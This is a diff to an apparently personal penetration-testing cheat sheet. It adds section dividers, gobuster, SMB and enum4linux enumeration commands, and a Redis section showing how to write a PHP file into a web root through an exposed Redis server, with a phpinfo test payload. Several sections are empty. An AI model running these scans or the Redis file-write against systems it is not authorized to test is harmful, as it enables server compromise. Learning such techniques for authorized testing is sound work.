@@ -23,6 +23,7 @@ https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh
 
 
 
+------------------------------------
 GOBUSTER
 gobuster dir -u http://url -w /location/wordlist/file.txt
 gobuster vhost -u http://url -w /location/wordlist/file.txt
@@ -31,6 +32,7 @@ gobuster vhost -u http://url -w /location/wordlist/file.txt
 /usr/share/seclists/Discovery/Web-Content/big.txt
 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
+------------------------------------
 
 
 FTP
@@ -39,14 +41,81 @@ showmount -e 10.10.10.10
 smbclient -L 10.10.10.10
 
 
+------------------------------------
 SMB 
 nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 -oA smb_vuln_scan_192.168.189.42 192.168.189.42
 
 
+------------------------------------
+Redis - 6379
+nmap --script redis-info -sV -p 6379 <IP>
+
+To check if the db is able to apply Server side execution run the following, then try to run the file from the browser.
+root@Urahara:~# redis-cli -h 10.85.0.52
+10.85.0.52:6379> config set dir /usr/share/nginx/html
+OK
+10.85.0.52:6379> config set dbfilename redis.php
+OK
+10.85.0.52:6379> set test "<?php phpinfo(); ?>"
+OK
+10.85.0.52:6379> save
+OK
+
+>info 
+>get config *
+
+https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
+
+------------------------------------
+MongoDB - 27017,27018
+
+
+
+
+
+------------------------------------
 Enum4Linux
 
-WFUZZ
+enum4linux -e options http://[ip]
 
+
+
+
+
+------------------------------------
+FUZZING
+
+This can be done through ZAP but need to get a better understanding of what to do with the data once ran
+And run as a cli also with actual WFUZZ
+
+
+
+
+
+------------------------------------
 WPSCAN
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
